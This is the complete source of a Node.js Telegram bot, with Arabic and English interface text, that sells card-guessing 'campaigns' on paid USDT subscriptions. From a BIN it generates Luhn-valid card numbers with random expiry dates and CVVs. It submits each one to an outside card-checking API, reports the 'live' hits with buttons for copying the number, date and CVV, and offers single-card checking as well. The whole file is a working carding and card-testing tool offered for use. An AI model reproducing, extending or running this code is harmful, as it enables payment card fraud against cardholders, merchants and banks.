const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
    console.error('❌ الرجاء تعيين متغير البيئة TOKEN');
    process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });

// ==========================================
// إعداد قاعدة بيانات JSON بسيطة
// ==========================================
const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    if (!fs.existsSync(DATA_FILE)) return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [] };
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch(e) { return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [] }; }
}

function saveData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function getSubscriber(userId) {
    const data = loadData();
    if (!data.subscribers[userId]) {
        data.subscribers[userId] = {
            plan: 'free',
            startDate: new Date().toISOString(),
            endDate: new Date(Date.now() + 365*24*60*60*1000).toISOString(),
            campaignsLimit: 2,  // تغيير: المجاني 2 حملات
            cardsLimit: 10
        };
        saveData(data);
    }
    const sub = data.subscribers[userId];
    if (sub.plan !== 'free' && new Date(sub.endDate) < new Date()) {
        sub.plan = 'free';
        sub.campaignsLimit = 2;
        sub.cardsLimit = 10;
        sub.startDate = new Date().toISOString();
        sub.endDate = new Date(Date.now() + 365*24*60*60*1000).toISOString();
        saveData(data);
    }
    return data.subscribers[userId];
}

function updateSubscriber(userId, updates) {
    const data = loadData();
    data.subscribers[userId] = { ...data.subscribers[userId], ...updates };
    saveData(data);
}

function getUserActiveCampaigns(userId) {
    const data = loadData();
    return Object.values(data.campaigns).filter(c => c.userId === userId && c.status === 'running');
}

function createCampaign(userId, bin, total) {
    const data = loadData();
    const id = Date.now() + Math.random();
    data.campaigns[id] = {
        id, userId, bin, total, current: 0, hit: 0, status: 'running', createdAt: new Date().toISOString()
    };
    saveData(data);
    return id;
}

function updateCampaign(campaignId, current, hit, status) {
    const data = loadData();
    if (data.campaigns[campaignId]) {
        if (current !== undefined) data.campaigns[campaignId].current = current;
        if (hit !== undefined) data.campaigns[campaignId].hit = hit;
        if (status !== undefined) data.campaigns[campaignId].status = status;
        saveData(data);
    }
}

function createPendingPayment(userId, plan, code) {
    const data = loadData();
    const payment = {
        id: Date.now() + Math.random(),
        userId, plan, amount: PLANS[plan].price, code, status: 'waiting_payment', createdAt: new Date().toISOString()
    };
    data.pendingPayments.push(payment);
    saveData(data);
    return payment;
}

function getPendingPayment(userId, plan) {
    const data = loadData();
    return data.pendingPayments.find(p => p.userId === userId && p.plan === plan && p.status === 'waiting_payment');
}

function updatePendingPayment(id, status) {
    const data = loadData();
    const idx = data.pendingPayments.findIndex(p => p.id === id);
    if (idx !== -1) data.pendingPayments[idx].status = status;
    saveData(data);
}

function createPaymentProof(userId, plan, photoFileId, messageId) {
    const data = loadData();
    const proof = {
        id: Date.now() + Math.random(),
        userId, plan, photoFileId, messageId, status: 'pending', createdAt: new Date().toISOString()
    };
    data.paymentProofs.push(proof);
    saveData(data);
    return proof;
}

function getPaymentProof(id) {
    const data = loadData();
    return data.paymentProofs.find(p => p.id === id);
}

function updatePaymentProof(id, status) {
    const data = loadData();
    const idx = data.paymentProofs.findIndex(p => p.id === id);
    if (idx !== -1) data.paymentProofs[idx].status = status;
    saveData(data);
}

// ==========================================
// المتغيرات العامة
// ==========================================
const userLang = new Map(); // chatId -> 'ar'/'en'
const adminSet = new Set([643309456]);
const guessState = new Map();

const PLANS = {
    free: { name: { ar: 'مجاني', en: 'Free' }, price: 0, cardsLimit: 10, campaignsLimit: 2 },
    plus: { name: { ar: 'Plus', en: 'Plus' }, price: 3, cardsLimit: 70, campaignsLimit: 3 },
    pro: { name: { ar: 'Pro', en: 'Pro' }, price: 5, cardsLimit: 150, campaignsLimit: 5 },
    vip: { name: { ar: 'VIP', en: 'VIP' }, price: 8, cardsLimit: 350, campaignsLimit: 7 }
};

const BINANCE_PAY_ID = '842505320';

// ==========================================
// دوال مساعدة (Luhn, توليد، أعلام)
// ==========================================
const countryFlags = {
    'united states': '🇺🇸', 'usa': '🇺🇸', 'us': '🇺🇸',
    'united kingdom': '🇬🇧', 'uk': '🇬🇧', 'britain': '🇬🇧',
    'saudi arabia': '🇸🇦', 'ksa': '🇸🇦', 'saudi': '🇸🇦',
    'egypt': '🇪🇬', 'uae': '🇦🇪', 'kuwait': '🇰🇼', 'qatar': '🇶🇦',
    'bahrain': '🇧🇭', 'oman': '🇴🇲', 'jordan': '🇯🇴', 'lebanon': '🇱🇧',
    'iraq': '🇮🇶', 'syria': '🇸🇾', 'palestine': '🇵🇸', 'turkey': '🇹🇷',
    'germany': '🇩🇪', 'france': '🇫🇷', 'italy': '🇮🇹', 'spain': '🇪🇸',
    'netherlands': '🇳🇱', 'belgium': '🇧🇪', 'switzerland': '🇨🇭', 'austria': '🇦🇹',
    'russia': '🇷🇺', 'china': '🇨🇳', 'japan': '🇯🇵', 'south korea': '🇰🇷',
    'india': '🇮🇳', 'brazil': '🇧🇷', 'canada': '🇨🇦', 'mexico': '🇲🇽',
    'australia': '🇦🇺', 'indonesia': '🇮🇩', 'malaysia': '🇲🇾', 'singapore': '🇸🇬',
    'thailand': '🇹🇭', 'vietnam': '🇻🇳', 'philippines': '🇵🇭', 'pakistan': '🇵🇰',
    'bangladesh': '🇧🇩', 'south africa': '🇿🇦', 'nigeria': '🇳🇬', 'morocco': '🇲🇦',
    'algeria': '🇩🇿', 'tunisia': '🇹🇳', 'libya': '🇱🇾', 'sudan': '🇸🇩', 'yemen': '🇾🇪'
};

function getFlag(countryName) {
    if (!countryName) return '🌍';
    const lower = countryName.toLowerCase();
    for (const [key, flag] of Object.entries(countryFlags)) {
        if (lower.includes(key)) return flag;
    }
    return '🌍';
}

function getCardType(cardNumber) {
    const first = cardNumber[0];
    const two = cardNumber.slice(0,2);
    const four = cardNumber.slice(0,4);
    if (first === '4') return 'فيزا كارد';
    if (two >= '51' && two <= '55') return 'ماستر كارد';
    if (two === '34' || two === '37') return 'امريكان اكسبريس';
    if (four === '6011' || two === '65' || (two >= '64' && two <= '65')) return 'ديسكفر';
    if (two === '35') return 'جيه سي بي';
    if (two === '30' || two === '36' || two === '38' || two === '39') return 'دينرز كلوب';
    if (two === '50') return 'ميركاتيل';
    if (two === '56' || two === '57' || two === '58') return 'مايسترو';
    return 'بطاقة ائتمانية';
}

function checkLuhn(cardNumber) {
    let sum = 0, alt = false;
    for (let i = cardNumber.length-1; i >=0; i--) {
        let digit = parseInt(cardNumber[i],10);
        if (alt) { digit *= 2; if (digit > 9) digit -= 9; }
        sum += digit;
        alt = !alt;
    }
    return sum % 10 === 0;
}

function generateRandomMonth() { return String(Math.floor(Math.random()*12)+1).padStart(2,'0'); }
function generateRandomYear() { return String(new Date().getFullYear() + Math.floor(Math.random()*5)); }
function generateRandomCVV() { return String(Math.floor(Math.random()*900)+100); }

function generateCardNumber(bin, length=16) {
    let card = bin;
    while (card.length < length-1) card += Math.floor(Math.random()*10);
    for (let i=0; i<=9; i++) {
        const test = card + i;
        if (checkLuhn(test)) return test;
    }
    return card+'0';
}

function generateFullVisa(bin) {
    const num = generateCardNumber(bin);
    return `${num}|${generateRandomMonth()}|${generateRandomYear()}|${generateRandomCVV()}`;
}

function generateRandomCode() {
    return Math.random().toString(36).substring(2,10).toUpperCase();
}

// ==========================================
// دوال API للفحص
// ==========================================
async function checkSingleCard(cardString, chatId, isSilent = false) {
    const parts = cardString.split('|');
    if (parts.length >=1 && !checkLuhn(parts[0])) return null;
    try {
        const response = await axios.post('https://api.chkr.cc/', { data: cardString }, {
            headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
            timeout: 10000
        });
        const data = response.data;
        const isLive = (data.code === 1);
        if (!isLive && !isSilent && data.message) return null;
        return {
            isLive,
            status: data.status || 'غير معروف',
            message: (data.message || '').replace(/احذفها/gi,'').trim(),
            type: (data.card && data.card.type) || getCardType(cardString.split('|')[0]),
            country: (data.card && data.card.country && data.card.country.name) || 'غير معروف'
        };
    } catch(e) {
        if (!isSilent) await bot.sendMessage(chatId, translations[userLang.get(chatId)||'ar'].api_error);
        return null;
    }
}

// ==========================================
// دوال الأزرار والنسخ
// ==========================================
function getCopyButtons(fullCard, lang) {
    const [num, month, year, cvv] = fullCard.split('|');
    const dict = translations[lang];
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: dict.btn_copy_full, callback_data: `copy_full_${fullCard}` }],
                [{ text: dict.btn_copy_num, callback_data: `copy_num_${num}` }],
                [{ text: dict.btn_copy_exp, callback_data: `copy_exp_${month}|${year}` }],
                [{ text: dict.btn_copy_cvv, callback_data: `copy_cvv_${cvv}` }]
            ]
        }
    };
}

// ==========================================
// الترجمات الكاملة (عربي وإنجليزي)
// ==========================================
const translations = {
    ar: {
        choose_lang: 'اختر لغتك / Choose your language:',
        lang_changed: '✅ تم تغيير اللغة إلى العربية',
        main_menu: '✨ *القائمة الرئيسية* ✨\nاختر أحد الخيارين:',
        btn_guess: '🎲 تخمين مجموعة فيزات',
        btn_single: '🔍 فحص فيزا واحدة',
        btn_subscribe: '💎 الاشتراكات',
        btn_my_campaigns: '📋 حملاي النشطة',
        cancel_btn: '❌ إلغاء',
        btn_copy_full: '📋 نسخ الفيزا كاملة',
        btn_copy_num: '🔢 نسخ الرقم',
        btn_copy_exp: '📅 نسخ التاريخ',
        btn_copy_cvv: '🔐 نسخ CVV',
        enter_bin: '📌 أرسل الـ BIN الخاص بك (أول 6 أرقام أو أكثر)\nمثال: `62581`',
        enter_count: '🔢 كم عدد الفيزات التي تريد تخمينها؟\n(الحد الأدنى 5، الحد الأقصى {max})',
        admin_unlimited: '\nللأدمن: لا يوجد حد أقصى.',
        count_out_of_range: '⚠️ العدد يجب أن يكون بين 5 و {max}.',
        cancel_msg: '❌ تم إلغاء العملية.',
        generating: '🔄 جاري إنشاء الفيزا {current}/{total} {dots}\n━━━━━━━━━━━━━━\n📌 BIN: {bin}',
        live_result: '✅ تعمل بنجاح ✅\n----------------------------------------\n\n💳    {card}\n\n📊 الحالة: تعمل ✅\n\n🏦 النوع: {type}\n\n🌍 البلد: {country} {flag}\n\n----------------------------------------\nبواسطة: @pe8bot',
        no_live_found: '😞 لم يتم العثور على أي بطاقة صالحة من أصل {total}.',
        new_campaign_btn: '🚀 بدأ حملة جديدة',
        summary: '📊 *الملخص النهائي*\n✅ الصالحة: {hit}\n🎯 المجموع: {total}',
        single_invalid: '📌 أرسل الفيزا كاملة بهذا التنسيق:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ جاري فحص البطاقة...',
        api_error: '⚠️ حدث خطأ أثناء الاتصال بالخدمة.',
        unknown: 'غير معروف',
        not_admin: '⛔ هذا الأمر للأدمن فقط.',
        subscription_plans: '💎 *خطط الاشتراك*\nاختر الخطة:',
        plan_plus: '🥇 Plus',
        plan_pro: '🥈 Pro',
        plan_vip: '🥉 VIP',
        subscribe_confirm: '✅ اخترت خطة {plan}\nقم بتحويل {amount} USDT إلى معرف بايننس:\n`{payId}`\nواكتب هذا الكود في الملاحظات:\n`{code}`\nثم أرسل صورة التحويل هنا.',
        payment_timeout: '⚠️ لم يتم إرسال صورة التحويل خلال 20 ثانية. يرجى إرسال صورة التحويل للتحقق من الدفعة.',
        payment_received: '📸 تم استلام الصورة. سيتم مراجعتها قريباً.',
        payment_approved: '🎉 تم تفعيل اشتراك {plan} بنجاح!',
        payment_rejected: '❌ تم رفض طلب الاشتراك.',
        campaigns_limit_reached: '⚠️ لقد وصلت للحد الأقصى للحملات المتزامنة ({limit}).',
        campaign_stopped: '🛑 تم إيقاف الحملة {id}.',
        no_active_campaigns: '⚠️ لا توجد حملات نشطة.',
        active_campaigns: '📋 *حملاي النشطة*\n'
    },
    en: {
        choose_lang: 'Choose your language / اختر لغتك:',
        lang_changed: '✅ Language changed to English',
        main_menu: '✨ *Main Menu* ✨\nChoose an option:',
        btn_guess: '🎲 Guess multiple cards',
        btn_single: '🔍 Check single card',
        btn_subscribe: '💎 Subscriptions',
        btn_my_campaigns: '📋 My active campaigns',
        cancel_btn: '❌ Cancel',
        btn_copy_full: '📋 Copy full card',
        btn_copy_num: '🔢 Copy number',
        btn_copy_exp: '📅 Copy expiry',
        btn_copy_cvv: '🔐 Copy CVV',
        enter_bin: '📌 Send your BIN (first 6 digits or more)\nExample: `62581`',
        enter_count: '🔢 How many cards to guess?\n(Min 5, Max {max})',
        admin_unlimited: '\nFor admin: no upper limit.',
        count_out_of_range: '⚠️ Count must be between 5 and {max}.',
        cancel_msg: '❌ Operation cancelled.',
        generating: '🔄 Generating card {current}/{total} {dots}\n━━━━━━━━━━━━━━\n📌 BIN: {bin}',
        live_result: '✅ LIVE ✅\n----------------------------------------\n\n💳    {card}\n\n📊 Status: LIVE ✅\n\n🏦 Type: {type}\n\n🌍 Country: {country} {flag}\n\n----------------------------------------\nBy: @pe8bot',
        no_live_found: '😞 No live cards found out of {total}.',
        new_campaign_btn: '🚀 Start new campaign',
        summary: '📊 *Final Summary*\n✅ Live: {hit}\n🎯 Total: {total}',
        single_invalid: '📌 Send the full card in this format:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ Checking card...',
        api_error: '⚠️ API error. Please try again later.',
        unknown: 'Unknown',
        not_admin: '⛔ This command is for admins only.',
        subscription_plans: '💎 *Subscription Plans*\nChoose your plan:',
        plan_plus: '🥇 Plus',
        plan_pro: '🥈 Pro',
        plan_vip: '🥉 VIP',
        subscribe_confirm: '✅ You selected {plan} plan\nPlease send {amount} USDT to Binance ID:\n`{payId}`\nAnd write this code in the memo:\n`{code}`\nThen send the payment proof photo here.',
        payment_timeout: '⚠️ No payment proof received within 20 seconds. Please send the payment proof photo to verify.',
        payment_received: '📸 Payment proof received. It will be reviewed soon.',
        payment_approved: '🎉 Your {plan} subscription has been activated!',
        payment_rejected: '❌ Subscription request rejected.',
        campaigns_limit_reached: '⚠️ You have reached the maximum concurrent campaigns ({limit}).',
        campaign_stopped: '🛑 Campaign {id} stopped.',
        no_active_campaigns: '⚠️ No active campaigns.',
        active_campaigns: '📋 *Your active campaigns*\n'
    }
};

// ==========================================
// دوال إدارة الحملات والتخمين
// ==========================================
async function runCampaign(chatId, campaignId, bin, total) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    let progressMsg = await bot.sendMessage(chatId, dict.generating.replace('{current}',0).replace('{total}',total).replace('{dots}','.').replace('{bin}',bin));
    let hit = 0;
    for (let i=1; i<=total; i++) {
        const state = guessState.get(chatId);
        if (state && state.cancelFlag) {
            await bot.sendMessage(chatId, dict.cancel_msg);
            updateCampaign(campaignId, i-1, hit, 'cancelled');
            try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
            guessState.delete(chatId);
            return;
        }
        try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
        progressMsg = await bot.sendMessage(chatId, dict.generating.replace('{current}',i).replace('{total}',total).replace('{dots}','.'.repeat(i%5+1)).replace('{bin}',bin));
        const fullVisa = generateFullVisa(bin);
        const result = await checkSingleCard(fullVisa, chatId, true);
        if (result && result.isLive) {
            hit++;
            const flag = getFlag(result.country);
            const cardType = getCardType(fullVisa.split('|')[0]);
            const liveText = dict.live_result.replace('{card}',fullVisa).replace('{type}',cardType).replace('{country}',result.country).replace('{flag}',flag);
            const buttons = getCopyButtons(fullVisa, lang);
            await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
        }
        updateCampaign(campaignId, i, hit, 'running');
    }
    try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
    if (hit === 0) {
        const noLive = dict.no_live_found.replace('{total}',total);
        const keyboard = { reply_markup: { inline_keyboard: [[{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]] } };
        await bot.sendMessage(chatId, noLive, keyboard);
    } else {
        await bot.sendMessage(chatId, dict.summary.replace('{hit}',hit).replace('{total}',total));
    }
    updateCampaign(campaignId, total, hit, 'completed');
    guessState.delete(chatId);
}

async function startNewCampaign(chatId, bin, total) {
    const subscriber = getSubscriber(chatId);
    const planName = subscriber.plan;
    const campaignsLimit = PLANS[planName].campaignsLimit;
    const active = getUserActiveCampaigns(chatId);
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    if (active.length >= campaignsLimit) {
        await bot.sendMessage(chatId, dict.campaigns_limit_reached.replace('{limit}', campaignsLimit));
        return;
    }
    const campaignId = createCampaign(chatId, bin, total);
    await runCampaign(chatId, campaignId, bin, total);
}

// ==========================================
// معالجة الاشتراكات والدفع
// ==========================================
async function handleSubscription(chatId, plan) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const code = generateRandomCode();
    createPendingPayment(chatId, plan, code);
    const text = dict.subscribe_confirm.replace('{plan}',plan.toUpperCase()).replace('{amount}',PLANS[plan].price).replace('{payId}',BINANCE_PAY_ID).replace('{code}',code);
    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    
    // المهلة 20 ثانية
    setTimeout(async () => {
        const pending = getPendingPayment(chatId, plan);
        if (pending && pending.status === 'waiting_payment') {
            await bot.sendMessage(chatId, dict.payment_timeout);
            // لا نغير الحالة حتى يرسل الصورة، فقط نذكره
        }
    }, 20000);
}

// ==========================================
// عرض القوائم
// ==========================================
async function showMainMenu(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: dict.btn_guess, callback_data: 'menu_guess' }],
                [{ text: dict.btn_single, callback_data: 'menu_single' }],
                [{ text: dict.btn_subscribe, callback_data: 'menu_subscribe' }],
                [{ text: dict.btn_my_campaigns, callback_data: 'menu_my_campaigns' }]
            ]
        },
        parse_mode: 'Markdown'
    };
    await bot.sendMessage(chatId, dict.main_menu, opts);
}

async function showSubscriptionMenu(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: dict.plan_plus, callback_data: 'sub_plus' }],
                [{ text: dict.plan_pro, callback_data: 'sub_pro' }],
                [{ text: dict.plan_vip, callback_data: 'sub_vip' }],
                [{ text: dict.cancel_btn, callback_data: 'cancel' }]
            ]
        }
    };
    await bot.sendMessage(chatId, dict.subscription_plans, opts);
}

async function showMyCampaigns(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const campaigns = getUserActiveCampaigns(chatId);
    if (campaigns.length === 0) {
        await bot.sendMessage(chatId, dict.no_active_campaigns);
        return;
    }
    let text = dict.active_campaigns;
    const buttons = [];
    for (const c of campaigns) {
        text += `\n📌 BIN: ${c.bin} | Progress: ${c.current}/${c.total} | Hits: ${c.hit}`;
        buttons.push([{ text: `${dict.campaign_stopped.split(' ')[0]} ${c.id}`, callback_data: `stop_camp_${c.id}` }]);
    }
    buttons.push([{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]);
    await bot.sendMessage(chatId, text, { reply_markup: { inline_keyboard: buttons } });
}

// ==========================================
// أوامر البوت
// ==========================================
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [[{ text: 'العربية', callback_data: 'lang_ar' }, { text: 'English', callback_data: 'lang_en' }]]
        }
    };
    await bot.sendMessage(chatId, translations.ar.choose_lang, opts);
});

bot.onText(/\/menu/, async (msg) => { await showMainMenu(msg.chat.id); });
bot.onText(/\/cancel/, async (msg) => {
    const chatId = msg.chat.id;
    const state = guessState.get(chatId);
    const dict = translations[userLang.get(chatId) || 'ar'];
    if (state) { state.cancelFlag = true; await bot.sendMessage(chatId, dict.cancel_msg); }
    else await bot.sendMessage(chatId, '⚠️ No active process.');
});

bot.onText(/\/addadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const dict = translations[userLang.get(chatId) || 'ar'];
    if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
    const id = parseInt(match[1]);
    if (isNaN(id)) return;
    adminSet.add(id);
    await bot.sendMessage(chatId, `✅ Added admin ${id}`);
});
bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const dict = translations[userLang.get(chatId) || 'ar'];
    if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
    const id = parseInt(match[1]);
    if (id === 643309456) { await bot.sendMessage(chatId, '⚠️ Cannot remove main admin'); return; }
    adminSet.delete(id);
    await bot.sendMessage(chatId, `✅ Removed admin ${id}`);
});
bot.onText(/\/admins/, async (msg) => {
    const chatId = msg.chat.id;
    const dict = translations[userLang.get(chatId) || 'ar'];
    if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
    await bot.sendMessage(chatId, `📋 Admins: ${Array.from(adminSet).join(', ')}`);
});

// ==========================================
// معالجة callback_query
// ==========================================
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    await bot.answerCallbackQuery(query.id);

    // أزرار النسخ
    if (data.startsWith('copy_full_')) {
        const full = data.replace('copy_full_','');
        await bot.sendMessage(chatId, `\`${full}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_num_')) {
        const num = data.replace('copy_num_','');
        await bot.sendMessage(chatId, `\`${num}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_exp_')) {
        const exp = data.replace('copy_exp_','');
        await bot.sendMessage(chatId, `\`${exp}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_cvv_')) {
        const cvv = data.replace('copy_cvv_','');
        await bot.sendMessage(chatId, `\`${cvv}\``, { parse_mode: 'Markdown' });
        return;
    }

    // اللغة
    if (data === 'lang_ar') { userLang.set(chatId, 'ar'); await bot.sendMessage(chatId, translations.ar.lang_changed); await showMainMenu(chatId); return; }
    if (data === 'lang_en') { userLang.set(chatId, 'en'); await bot.sendMessage(chatId, translations.en.lang_changed); await showMainMenu(chatId); return; }

    // القائمة الرئيسية
    if (data === 'menu_guess') {
        guessState.set(chatId, { step: 'awaiting_bin', cancelFlag: false });
        const cancelKeyboard = { reply_markup: { inline_keyboard: [[{ text: dict.cancel_btn, callback_data: 'cancel_guess' }]] } };
        await bot.sendMessage(chatId, dict.enter_bin, { parse_mode: 'Markdown', ...cancelKeyboard });
        return;
    }
    if (data === 'menu_single') {
        await bot.sendMessage(chatId, dict.single_invalid, { parse_mode: 'Markdown' });
        return;
    }
    if (data === 'menu_subscribe') {
        await showSubscriptionMenu(chatId);
        return;
    }
    if (data === 'menu_my_campaigns') {
        await showMyCampaigns(chatId);
        return;
    }

    // الاشتراكات
    if (data === 'sub_plus') { await handleSubscription(chatId, 'plus'); return; }
    if (data === 'sub_pro') { await handleSubscription(chatId, 'pro'); return; }
    if (data === 'sub_vip') { await handleSubscription(chatId, 'vip'); return; }

    // إلغاء العملية
    if (data === 'cancel_guess') {
        const state = guessState.get(chatId);
        if (state) { state.cancelFlag = true; guessState.delete(chatId); await bot.sendMessage(chatId, dict.cancel_msg); }
        return;
    }

    // إيقاف حملة
    if (data.startsWith('stop_camp_')) {
        const campId = parseFloat(data.split('_')[2]);
        updateCampaign(campId, null, null, 'stopped');
        await bot.sendMessage(chatId, dict.campaign_stopped.replace('{id}', campId));
        await showMyCampaigns(chatId);
        return;
    }

    // قبول/رفض الدفع من الأدمن
    if (data.startsWith('approve_payment_') || data.startsWith('reject_payment_')) {
        if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
        const parts = data.split('_');
        const action = parts[0];
        const proofId = parseFloat(parts[2]);
        const proof = getPaymentProof(proofId);
        if (proof) {
            if (action === 'approve') {
                const end = new Date();
                end.setMonth(end.getMonth() + 1);
                updateSubscriber(proof.userId, {
                    plan: proof.plan,
                    startDate: new Date().toISOString(),
                    endDate: end.toISOString(),
                    campaignsLimit: PLANS[proof.plan].campaignsLimit,
                    cardsLimit: PLANS[proof.plan].cardsLimit
                });
                updatePaymentProof(proofId, 'approved');
                const pending = getPendingPayment(proof.userId, proof.plan);
                if (pending) updatePendingPayment(pending.id, 'approved');
                const userDict = translations[userLang.get(proof.userId) || 'ar'];
                await bot.sendMessage(proof.userId, userDict.payment_approved.replace('{plan}', proof.plan.toUpperCase()));
                await bot.sendMessage(chatId, `✅ Subscription activated for user ${proof.userId}`);
            } else {
                updatePaymentProof(proofId, 'rejected');
                const userDict = translations[userLang.get(proof.userId) || 'ar'];
                await bot.sendMessage(proof.userId, userDict.payment_rejected);
                await bot.sendMessage(chatId, `❌ Subscription rejected for user ${proof.userId}`);
            }
        }
        return;
    }
});

// ==========================================
// معالجة الرسائل النصية (BIN، العدد، صور الدفع، فيزا واحدة)
// ==========================================
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];

    // معالجة الصور (إثباتات الدفع)
    if (msg.photo) {
        const photo = msg.photo[msg.photo.length-1];
        const fileId = photo.file_id;
        const pendingItem = Object.values(loadData().pendingPayments).find(p => p.userId === chatId && p.status === 'waiting_payment');
        if (pendingItem) {
            const proof = createPaymentProof(chatId, pendingItem.plan, fileId, msg.message_id);
            const caption = `📸 New payment proof\nUser: ${chatId}\nPlan: ${pendingItem.plan}\nAmount: ${pendingItem.amount} USDT\nCode: ${pendingItem.code}`;
            const adminKeyboard = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '✅ Approve', callback_data: `approve_payment_${proof.id}` }],
                        [{ text: '❌ Reject', callback_data: `reject_payment_${proof.id}` }]
                    ]
                }
            };
            for (const adminId of adminSet) {
                await bot.sendPhoto(adminId, fileId, { caption, ...adminKeyboard });
            }
            await bot.sendMessage(chatId, dict.payment_received);
            updatePendingPayment(pendingItem.id, 'proof_sent');
        } else {
            await bot.sendMessage(chatId, dict.api_error);
        }
        return;
    }

    // معالجة النصوص: حالة انتظار BIN
    const state = guessState.get(chatId);
    if (state && state.step === 'awaiting_bin') {
        if (/^\d+$/.test(text)) {
            let bin = text.slice(0,6);
            while (bin.length < 6) bin += Math.floor(Math.random()*10);
            state.bin = bin;
            state.step = 'awaiting_count';
            const subscriber = getSubscriber(chatId);
            const maxCards = subscriber.cardsLimit;
            const countMsg = dict.enter_count.replace('{max}', maxCards) + (adminSet.has(chatId) ? dict.admin_unlimited : '');
            const cancelKeyboard = { reply_markup: { inline_keyboard: [[{ text: dict.cancel_btn, callback_data: 'cancel_guess' }]] } };
            await bot.sendMessage(chatId, countMsg, cancelKeyboard);
        }
        return;
    }

    if (state && state.step === 'awaiting_count') {
        const count = parseInt(text);
        if (isNaN(count)) return;
        const subscriber = getSubscriber(chatId);
        const maxCards = subscriber.cardsLimit;
        if (!adminSet.has(chatId) && (count < 5 || count > maxCards)) {
            await bot.sendMessage(chatId, dict.count_out_of_range.replace('{max}', maxCards));
            return;
        }
        state.count = count;
        await startNewCampaign(chatId, state.bin, count);
        guessState.delete(chatId);
        return;
    }

    // فحص فيزا واحدة
    if (text && text.includes('|')) {
        await bot.sendMessage(chatId, dict.single_checking);
        const result = await checkSingleCard(text, chatId);
        if (result && result.isLive) {
            const flag = getFlag(result.country);
            const cardType = getCardType(text.split('|')[0]);
            const liveText = dict.live_result.replace('{card}',text).replace('{type}',cardType).replace('{country}',result.country).replace('{flag}',flag);
            const buttons = getCopyButtons(text, lang);
            await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
        }
        return;
    }
});

console.log('✅ البوت يعمل الآن مع دعم كامل للغتين، حملتين للمجاني، ومهلة 20 ثانية للدفع.');
